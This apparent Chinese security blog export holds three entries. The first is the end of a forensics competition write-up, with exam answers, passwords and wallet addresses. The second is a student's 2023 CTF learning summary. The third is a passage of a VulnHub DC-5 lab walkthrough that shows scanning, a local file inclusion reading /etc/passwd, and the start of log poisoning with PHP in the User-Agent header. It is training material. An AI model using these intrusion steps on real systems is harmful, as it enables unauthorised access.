alt="image-20240114181856726"></p><h3 id="31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）"><a href="#31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）" class="headerlink" title="31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）"></a>31、检材四备份的时间是多少（答案以13位时间戳表示）（1分）</h3><pre><code>1702459232429</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141819699.png" alt="image-20240114181946660"></p><h3 id="32、检材四中FileCompress-app-包名是什么？（1分）"><a href="#32、检材四中FileCompress-app-包名是什么？（1分）" class="headerlink" title="32、检材四中FileCompress app 包名是什么？（1分）"></a>32、检材四中FileCompress app 包名是什么？（1分）</h3><pre><code>com.zs.filecompress</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141820504.png" alt="image-20240114182015472"></p><h3 id="33、检材四中备忘录记录的内容是什么？（1分）"><a href="#33、检材四中备忘录记录的内容是什么？（1分）" class="headerlink" title="33、检材四中备忘录记录的内容是什么？（1分）"></a>33、检材四中备忘录记录的内容是什么？（1分）</h3><pre><code>Vcpswd:edgewallet</code></pre><p>给出的应用中并没有备忘录 是因为小米手机里面的备忘录就是笔记 火眼分析之后给出的名字叫便签 其实都是一个东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141824917.png" alt="image-20240114182451871"></p><h3 id="34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）"><a href="#34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）" class="headerlink" title="34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）"></a>34、请列出检材四中所有虚拟币钱包app的包名，如有多个用顿号分隔。（3分）</h3><pre><code>de.schildbach.wallet、com.bitcoin.mwallet、 piuk.blockchain.android、im.token.app、com.paxful.wallet、pro.huobi</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141827195.png" alt="image-20240114182713135"></p><h3 id="35、检材四中嫌疑人使用Bitcoin-Wallet钱包地址是什么？（3分）"><a href="#35、检材四中嫌疑人使用Bitcoin-Wallet钱包地址是什么？（3分）" class="headerlink" title="35、检材四中嫌疑人使用Bitcoin Wallet钱包地址是什么？（3分）"></a>35、检材四中嫌疑人使用Bitcoin Wallet钱包地址是什么？（3分）</h3><pre><code>bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt</code></pre><p>在<code>Bitcoin Wallet(de.schildbach.wallet)\apps\de.schildbach.wallet\f\log\wallet.log</code>中搜索<code>address</code>找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401141841378.png" alt="image-20240114184143339"></p><h3 id="36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）"><a href="#36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）" class="headerlink" title="36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）"></a>36、MD5值为“FF3DABD0A610230C2486BFFBE15E5DFF”的文件在检材四中的位置（2分）</h3><pre><code>FileCompress(com.zs.filecompress)/FileCompress/11月.txt</code></pre><p>使用火眼哈希值计算工具批量计算检材四和bak文件解压出来的应用文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142205682.png" alt="image-20240114220539617"></p><p>将计算结果进行导出 搜索目标哈希值 找到对应文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142206759.png" alt="image-20240114220638668"></p><h2 id="综合题目"><a href="#综合题目" class="headerlink" title="综合题目"></a>综合题目</h2><h3 id="37、检材中受害人的微信号是多少？（2分）"><a href="#37、检材中受害人的微信号是多少？（2分）" class="headerlink" title="37、检材中受害人的微信号是多少？（2分）"></a>37、检材中受害人的微信号是多少？（2分）</h3><pre><code>B-I-N-A-R-Y</code></pre><p>在嫌疑人的苹果手机的微信记录中有受害人的微信号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132314793.png" alt="image-20240113231439720"></p><h3 id="38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）"><a href="#38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）" class="headerlink" title="38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）"></a>38、嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是8686的用户的姓名是（3分）</h3><pre><code>章敏</code></pre><p>在嫌疑人的苹果手机微信聊天记录中显示嫌疑人从枫叶的手上购买过数据库  文件名为<code>database.sqlite </code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132316046.png" alt="image-20240113231632972"></p><p>这个名字的数据库在检材二中是找不到的 但是在检材一计算机的微信下载记录中可以找到名为<code>database(1).sqlite</code>的数据库文件 结合检材二微信聊天记录中枫叶前后给嫌疑人发了两次数据库文件 第二次为正确的 因为两次发送的数据库名字都是<code>database.sqlite</code> 因此第二次嫌疑人下载数据库文件的时候 名字自然就是<code>database(1).sqlite</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132323262.png" alt="image-20240113232357169"></p><p>我们导出这个文件 在Navicat中打开 就可以找到手机尾号是8686的用户的姓名是章敏</p><h3 id="39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）"><a href="#39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）" class="headerlink" title="39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）"></a>39、嫌疑人手机中是否保存了小西米语音app的账号密码，如有，请写出其密码（5分）</h3><pre><code>jamvU1@wiwgug$bo</code></pre><p>在检材一 的钥匙串——网站与应用密码里面 找到了小西米语音的包名对应的就是账号密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142354168.png" alt="image-20240114235414125"></p><h3 id="40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）"><a href="#40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）" class="headerlink" title="40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）"></a>40、公民信息数据库中，截止到2023年12月31日，年龄大于等于18且小于等于30岁之间的用户信息数量（5分）</h3><pre><code>1717</code></pre><p>使用sql语句在第38题找到的公民信息数据库中查找</p><pre><code class="sql">SELECT COUNT(*) AS user_countFROM usersWHERE     strftime(&#39;%Y&#39;, &#39;2023-12-31&#39;) - SUBSTR(IDCARD, 7, 4) BETWEEN 18 AND 30;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151652323.png" alt="image-20240115165228270"></p><h3 id="41、受害人小浩的手机号码是多少（5分）"><a href="#41、受害人小浩的手机号码是多少（5分）" class="headerlink" title="41、受害人小浩的手机号码是多少（5分）"></a>41、受害人小浩的手机号码是多少（5分）</h3><pre><code>13533333333</code></pre><p>在检材三Filecomprss应用文件夹里面有一个<code>11月.txt</code>的文件 其实是一个被修改后缀名的压缩包 解压需要密码 Filecompress应该是一个压缩加密工具 需要我们对这个apk进行逆向 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142357703.png" alt="image-20240114235746603"></p><p>找到密码<code>1!8Da9Re5it2b3a.</code> 解压后得到小浩的手机号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142359667.png" alt="image-20240114235901635"></p><h3 id="42、完整的受害人名单是几个人。（6分）"><a href="#42、完整的受害人名单是几个人。（6分）" class="headerlink" title="42、完整的受害人名单是几个人。（6分）"></a>42、完整的受害人名单是几个人。（6分）</h3><pre><code>6</code></pre><p>按照上一题的思路 我们在11月.txt的文件中找到了两个受害人 而在检材一计算机的取证结果中 我们在最近访问的结果中看到了9月.txt和10月.txt 那猜测这两个文件中也有当月受害人的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151218108.png" alt="image-20240115121851995"></p><p>但是我们仿真计算机之后并没有找到这两个文件 反而在最近使用文件中找到了一个大小很可疑的<code>新建文本文档.txt</code> 猜测是VC容器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151234092.png" alt="image-20240115123438031"></p><p>在第33题中 我们找到了检材四备忘录的内容是<code>Vcpswd:edgewallet </code> 那看来VC容器的挂载密码应该和edgewallet的密码有关 </p><p>在检材一的edge浏览器保存的密码中可以找到edgewallet的账号密码 <code>tiga.ultraman@outlook.com\pR7)nZ5&amp;yQ2-oR0&lt;</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151237617.png" alt="image-20240115123741561"></p><p>尝试使用这个密码对VC容器进行挂载 挂载成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151238728.png" alt="image-20240115123840686"></p><p>9月.txt和10月.txt 都在里面 其中9月.txt可以直接打开 10月.txt和11月.txt一样是一个修改了后缀名的压缩包 加密方式和加密密码与11月.txt一样 解压之后就可以得到真正的10月.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151241106.png" alt="image-20240115124149063"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151242669.png" alt="image-20240115124200645"></p><p>所以受害人一共有6人</p><h3 id="43、受害人转账的总金额是多少（5分）"><a href="#43、受害人转账的总金额是多少（5分）" class="headerlink" title="43、受害人转账的总金额是多少（5分）"></a>43、受害人转账的总金额是多少（5分）</h3><pre><code>600</code></pre><p>在给出的苹果手机备份和后面找到的加密手机备份中都可以找到嫌疑人向受害人索要钱财的聊天记录 分为3次 每次200 一共600元</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132334900.png" alt="image-20240113233409862"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132334979.png" alt="image-20240113233422928"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132333685.png" alt="image-20240113233355630"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.这次学到了很多新的做题方法</p><p>（1）在bitlocker密钥爆破时间很长时 可以先使用取证大师的内存解析工具从内存中找一找密钥文件</p><p>（2）遇到苹果加密备份 使用passwarekit爆破<code>Manifest.pslist</code>文件 得到密钥 在工具中解密备份在分析</p><p>（3）遇到大的内存镜像 vol2分析不了 vol3在虚拟机中不方便拖动镜像  可以先用取证大师和火眼的内存解析工具分析 两者结合起来看 </p><p>（4）遇到安卓手机bak备份文件 先使用7zip全部解压 再把解压后的文件拖进火眼里面分析即可</p><p>（5）多注意检材间的联系 同时要擅长发现vc tc等加密容器</p><p>（6）一些加密密钥有的时候可以通过逆向分析的方法来获得</p><p>2.大题的做题思路是：</p><p>（1）对检材一到四正常分析</p><p>（2）根据题目提示和内存镜像爆破结果发现嫌疑人曾搜索过“ios备份密码忘了怎么办 五位纯数字”，分析可能还有一个加密ios备份，在检材1嵌套证据文件中找到该加密备份，对该备份进行正常的数据解密、获取和分析。</p><p>（3）在家米备份中找到小西米语音的账号密码 根据题目提示也知道小西米语音的聊天记录中有东西 由此找到嫌疑人约定的电子钱包品牌和比例</p><p>（4）在检材四分析FileCompress时找到一个11月.txt 发现是加密压缩包 通过逆向分析FileCompress软件 找到压缩包密码 由此找到11月的受害人名单</p><p>（5）在检材一的最近访问项目中还存在10月.txt和9月.txt  但是找不到这两个文件 进一步发掘找到新建文本文档.txt 这个VC容器 在检材四的备忘录中提示VC容器密码 得到密码 挂载容器 找到完整的受害人名单</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ios加密备份 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>w3nx1z1的年度个人总结</title>
      <link href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
      <url>/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年度个人总结"><a href="#2023年度个人总结" class="headerlink" title="2023年度个人总结"></a>2023年度个人总结</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><pre><code>第一次写年度总结，倒也没有什么别的想法，只是觉得是时候总结给自己接触ctf，接触网络安全这一年一个小总结了。是的，是时候了。</code></pre><h2 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h2><p>本身我在进入大学之前是完全没有计算机基础的。很难想象我在高考报志愿的时候没有报一个计算机方向的专业，而且我本人当时也是非常抵触这个专业，感觉自己的脑子学不来，只是在提前批报了网安，也是单纯因为这个专业是你jd分最高的专业，而我当时是非常想学医的。所以也算是误打误撞走进这扇门的吧。</p><p>其实大一上学期本身是小学期再加上为时不短的军训，在通过纳新赛加入信息安全社团之后没多长时间，由于疫情原因就回家了(现在还是非常怀念因为yq而可以提前回家的日子)，之后就是网课、复习、考试。可以说大一上学期不能称为一个正式对于安全学习的开始。</p><p>我个人感觉真正学习的开始，还是在寒假。当时社团里面也没有像我们现在对于23级的管理一样，规划好假期督促学习的一系列计划，完全就是散养哈哈哈。但说白了学习本身就是自己的事情，倒也无可厚非。虽然当时自己还是处于一个懵懂的状态，对于怎么去学习取证、怎么去学习ctf完全没有一个自己的方法。于是便从基础的python语言学起，这里真的感谢我尚青哥，不论是在进入社团之前还是进入社团之后前期的学习过程中都给了我很大帮助。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312255741.png" alt="image-20231231225511655"></p><p>之后老师和学长们也给了一些资源，开始看取证和ctf的课程，再结合对比赛的复现和刷题，慢慢的自己也能做出来一些题了。ctf是选择了misc方向，听说misc打得好是可以成为全栈爷的hhh(绝对不是因为别的方向完全找不到入门的思路)</p><p>当时大大小小的比赛也参与了不少，记忆犹新就是西湖和春秋杯，真的只能签个到就润。做的稍微多一点的可能是nepnep战队办的CATCTF了吧，那也是第一次熬夜上分，大年三十上了一道新年题，本来已经要休息了，看到上新题了又爬起来看，没想到睡意全无就又冲了很长时间。</p><p>很快假期就结束了，又开始了高难度生活模式</p><h2 id="初具方向"><a href="#初具方向" class="headerlink" title="初具方向"></a>初具方向</h2><p>新学期开始之后，每天的生活也很简单，四点一线：食堂、宿舍、教学楼、实验室。基本上每天有空就去实验室，还是延续高中带来的那一套，学知识点、刷题、写wp，慢慢积累了很多misc的解题姿势也扩大了自己的脑洞。</p><p>带给我信心的一次比赛是山警举办的黄河流域网络空间安全技能挑战赛(后文简称”黄河流域“)。当时misc里面有一道是日卫星的题，做出来的人很少。我简单的搜了搜，发现有一道题和这道差不多，基本的原理和脚本都是大差不差的，于是下定决心要搞出来。可能放在现在看，当时那道题也没什么难的，但确实让我研究了一上午才搞出来。看着题目从灰色变为绿色，一种说不出来的成就感油然而生。虽然到最后也就出了一个web一个misc，同时也是感谢主办方给了大比例的获奖机会，拿到了人生中第一个ctf的奖。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312330175.png" alt="image-20231231233001115"></p><p>也是从这一刻开始，下定决心要坚持把这条道阻且长的安全之路走下去。</p><h2 id="确定方向"><a href="#确定方向" class="headerlink" title="确定方向"></a>确定方向</h2><p>之后就是按部就班的学习，也慢慢开始混迹于各个ctf群，虽然到后来发现基本上每个群都是换群不换人hhh，进了一个新群好多都是眼熟的师傅。直到有一天，在一个群里看到了星盟安全团队在招人，当时抱着试试的想法，简单写了一份粗糙的简历便投上去了。</p><p>因为是misc方向，所以是Ba1_Ma0师傅来带的面试，虽然给我的两道题都只是有思路但没有解出来，但还是成功进入了主队，现在想想还是非常开心的。开始以为猫爷也是做misc的，但当看到猫爷的博客之后才发现这才是真正的全栈爷啊呜呜呜。</p><p>接到通过结果的那个中午，我整个人都高兴的要飞起。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312340297.png" alt="image-20231231234026256"></p><p>但是很遗憾的是上半年国赛的成绩不是很理想，当时看了华北地区晋级榜单，好像就差50分一道题就可以进半决赛了，虽然前面有两只学长的队伍，就算我们勉强够上分数线也无法晋级线下就是了QAQ。</p><p>因此也意识到了只学misc还是有局限性的，于是开始了misc和web双修的过程，算是确定了方向。</p><h2 id="大一暑假"><a href="#大一暑假" class="headerlink" title="大一暑假"></a>大一暑假</h2><p>紧接着大一暑假学校安排了认知实习，非常幸运分到了网安大队，队里的大哥们人都很好，平时工作也不是很忙，还有专门的实验室，真的给我提供了一个非常优渥的学习环境。(队里的实验室真的是帅炸了)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312343237.png" alt="image-20231231234341018"></p><p>在战队里面进步的速度还是很快的，认识了很多超强的师傅，战队里一些制度也让我更加勤奋的去学习，这段时间也是快速积累实力的时期。</p><h2 id="步入正轨"><a href="#步入正轨" class="headerlink" title="步入正轨"></a>步入正轨</h2><p>进入大二，因为某些不可抗因素吧，我担任了军训班长，在那一个月的时间里，基本上学习处于一个停摆的状态。每晚带完新生要到10点钟左右，我在回到宿舍抓紧学一会儿，那时候真的身心俱疲，在这种情况下，去参加了蓝帽杯半决赛，也是很遗憾，差5名没能进决赛，感觉非常对不住老师和我的两位队友。</p><p>带训过程也让我认识了很多对网安感兴趣的新生，我也不遗余力的宣传社团的事情，后面社团招新过程也是全程有参与，看到很多优秀的学弟学妹加入社团，我打心底的高兴。</p><p>下半年连续参加了三场线下赛(真不想算上中科实数)，蓝帽、美亚、冀信，哈尔滨、厦门、石家庄，打比赛的过程中也学到了很多东西，尤其是冀信，比赛前两天的渗透+应急响应培训扫盲效果还是很好的。本来说是要参加攻防演练，于是在当时就开始学习接触渗透的知识，跟着wp打了四五个靶场，收集了一些基本的渗透工具和做题思路。作为打得第一场渗透和应急响应比赛，在冀信杯的时候还算正常发挥。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010038523.png" alt="image-20240101003816330"></p><p>打完冀信杯回学校后，就差不多该准备期末考试了，之后的一些ctf比赛也没怎么参加。这学期高强度的文化课让我实在是压力大，一学期的课都要在剩余的几天里突击完，属实是非常狼狈hhh</p><h2 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h2><p>回顾这一年的学习经历，其实不满意和意难平的地方还有很多。体制内学校繁杂的事务，往往让本就不多的学习时间更加碎片化。我自身的学习效率也是一个很大的问题，学到的东西还是太少了。在取证方面，还是太依赖自动化工具，参加过今年龙信杯、盘古石杯、美亚杯、中科实数杯等一系列取证比赛之后，不难看出日后取证比赛的出题趋势是向手工取证倾斜，常规的取证工具只能做出基础题甚至只能作为你取证的一个小依据。在取证这块还是应该深挖，否则难以跟上日渐增加的取证比赛难度，也难以增长自身实力。</p><p>不过学习就是这样子，和师傅们，和知识点们，和赛题们，你追我赶，只有存在挑战，才存在无限进步提升的可能。告别2023，拥抱2024，在新的一年里，无论是取证，还是ctf抑或是渗透，相信自己都能拿出全部的状态去学习，踏踏实实的掌握更多的技术，期待更精彩的未来！</p><h2 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h2><p>其实在学校里面的生活，大家应该懂的都懂，警务化管理下，活着已经是很棒了(bushi)日复一日的各种制度约束之下，或许只有在安全之路上的些许进步才能为我的生活激起一点涟漪。</p><p>精彩的部分还是在去线下比赛的日子里，比赛成绩先放一边，虽然每次可以出去的时间有限可以在大部分同学都只能待在学校的情况下，可以经由比赛和许多城市结缘，便足以让人羡慕。</p><ul><li><p>在哈尔滨逛中央大街</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010105768.png" alt="image-20240101010558526"></p></li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010106205.png" alt="image-20240101010609839"></p><ul><li>在厦门逛曾厝垵、坐船出海</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010107291.png" alt="image-20240101010710896"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010107995.png" alt="image-20240101010720755"></p><ul><li>在石家庄(虽然没啥好玩的，但是每天吃的都很好)</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010108442.png" alt="image-20240101010818692"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010108952.png" alt="image-20240101010835234"></p><p>希望新的一年中，自己可以除了学习之外，可以拿出一部分时间去多做运动，毕竟身体素质到最后联考的时候还是要达标的。也能将半年不玩的羽毛球重新拾起来，有时候真的希望时间可以拆成两半花啊</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>到这里，平平无奇的2023年度总结就要结束了，感谢自己能在2024年1月1号趁着还不算太晚将这篇年度总结写出来，也很感谢看到这里的大家。</p><p>感谢老师、学长学姐们的引导，让我打开安全这扇门，得以在大学生活中实现自己的价值，而不是随波逐流，虚度光阴。</p><p>也祝愿所有师傅们，在新的一年里，做自己想做的事，爱自己想爱的人，技术进步，生活顺利，一血拿到手软，挖洞随心所欲！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-5</title>
      <link href="/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-5通关记录"><a href="#vulnhub靶场DC-5通关记录" class="headerlink" title="vulnhub靶场DC-5通关记录"></a>vulnhub靶场DC-5通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.And just for the record, there is no phpmailer exploit involved. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.But if you&#39;re really, really stuck, you can watch this video which shows the first step.</code></pre><p>提到本次靶场中 不存在ssh服务</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先 给靶机开启NAT模式 使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121443158.png" alt="image-20231212144354908"></p><p>扫出来是<code>192.168.160.156</code></p><p>在扫描详细的端口信息</p><pre><code>nmap -A -p- -v 192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121447097.png" alt="image-20231212144708011"></p><pre><code>开放了80端口 存在web服务 使用nginx中间件 版本是1.6.2开放了111端口 存在rpcbind服务 版本是2.4</code></pre><h4 id="了解一下rpcbind服务"><a href="#了解一下rpcbind服务" class="headerlink" title="了解一下rpcbind服务"></a>了解一下rpcbind服务</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121514830.png" alt="image-20231212151438774"></p><p>这里要先说一下NFS文件系统 </p><pre><code>NFS(network file system)：网络文件系统。Linux下三大文件系统之一，采用C/S架构。允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS应用中，本地NFS客户端可以透明的读写位于远端NFS服务器上的文件。NFS服务器主要进程1 rpc.nfsd 进程NFS 服务的主进程，主要管理客户端是否能够接入 NFS 服务器以及数据的传输。该进程固定监听 TCP/UDP 2049 端口。2 rpc.mountd 进程管理和维护 NFS 文件系统，根据所设定的权限决定是否允许客户端挂载指定的共享目录。该进程监听的端口默认是不固定的。3 rpc.lockd 进程提供文件锁功能，防止多个客户端同时写入一个文件。该进程监听的端口默认是不固定的。4 rpc.statd 进程负责检查数据的状态及一致性，需要与 rpc.lockd 配合使用。该进程监听的端口默认是不固定的。5 rpcbind 进程RPC 的端口映射器进程，监听 UDP 111 端口。NFS服务端机器：通过NFS协议将文件共享到网络上NFS客户端机器：通过网络挂载NFS共享目录到本地</code></pre><pre><code>RPC(Remote Procedure Call):远程过程调用协议NFS 只提供了基本的文件处理功能，而不提供任何 TCP/IP 数据传输功能。它需要借助 RPC 协议才能实现 TCP/IP 数据传输功能。RPC 最主要的功能就是在指定每个 NFS 功能所对应的端口序号（port number ），并且回报给客户端，让客户端可以连结到正确的物理端口（port）上去。</code></pre><p>一般情况下 rpcbind服务运行在111、31端口  本次靶机的rpcbind服务就开在111端口上</p><p>在使用whatweb进行站点CMS识别</p><pre><code>whatweb -v 192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121537393.png" alt="image-20231212153754332"></p><p>使用dirb 扫一下目录</p><pre><code>dirb http://192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121540460.png" alt="image-20231212154018411"></p><p>没扫出来啥东西 </p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121541907.png" alt="image-20231212154101840"></p><p>在contact页面 看到可以提交东西 尝试随便写点内容提交</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121552060.png" alt="image-20231212155206018"></p><p>发现跳转到thankyou.php 对于提交的内容 使用GET方式进行上传 </p><p>但是注意到 在提交之后下面的年份发生了变化 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121558821.png" alt="image-20231212155846787"></p><p>从2019年变为了2018年 </p><p>尝试刷新发现 即使不传入参数 只刷新页面 这个年份也会改变 怀疑存在文件包含 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121607142.png" alt="image-20231212160757111"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121608184.png" alt="image-20231212160809141"></p><h4 id="确认文件包含"><a href="#确认文件包含" class="headerlink" title="确认文件包含"></a>确认文件包含</h4><p>在使用dirsearch扫一下目录 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121605333.png" alt="image-20231212160553291"></p><pre><code>[16:04:27] 200 -    4KB - /contact.php                                      [16:04:28] 301 -  184B  - /css  -&gt;  http://192.168.160.156/css/             [16:04:36] 200 -    6KB - /faq.php                                          [16:04:38] 200 -   17B  - /footer.php                                       [16:04:44] 301 -  184B  - /images  -&gt;  http://192.168.160.156/images/       [16:04:44] 403 -  570B  - /images/                                          [16:05:30] 200 -  852B  - /thankyou.php </code></pre><p>扫出来这些页面 其中<code>contact.php faq.php thankyou.php</code> 都已经出现过  访问一下<code>footer.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121612336.png" alt="image-20231212161256301"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121613522.png" alt="image-20231212161303494"></p><p>刷新一次 年份就会发生变化 因此<code>thankyou.php</code>存在文件包含 包含的文件是<code>footer.php</code></p><h4 id="使用bp找到文件包含的变量名和包含值"><a href="#使用bp找到文件包含的变量名和包含值" class="headerlink" title="使用bp找到文件包含的变量名和包含值"></a>使用bp找到文件包含的变量名和包含值</h4><p>在<code>thankyou.php</code>页面抓个包 发送到爆破页面 构造一个文件包含的GET请求头</p><pre><code>?1=1</code></pre><p>使用集束炸弹模式(Cluster bomb) 进行爆破  集束炸弹模式是笛卡尔积的方式来进行爆破 最为全面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121946709.png" alt="image-20231212194645640"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121947345.png" alt="image-20231212194700279"></p><p>爆破出了8组值 成功包含出<code>/etc/passwd</code>文件 得知文件包含的变量名是<code>file</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121954440.png" alt="image-20231212195424378"></p><h4 id="进行日志包含"><a href="#进行日志包含" class="headerlink" title="进行日志包含"></a>进行日志包含</h4><p>在前面信息搜集的时候 我们得知 该站点使用的中间件是<code>nginx</code> nginx的日志一般在<code>/var/log/nginx/access.log</code>中 尝试进行包含</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121959299.png" alt="image-20231212195953211"></p><p>根据日志包含的知识 http请求头中<code>user-agent</code>部分的内容会出现在日志中 我们就可以在<code>user-agent</code>中写入shell 在包含日志文件 执行shell</p><p>我们写入</p><pre><code>&lt;?php phpinfo(); ?&gt;</code></pre><p><img 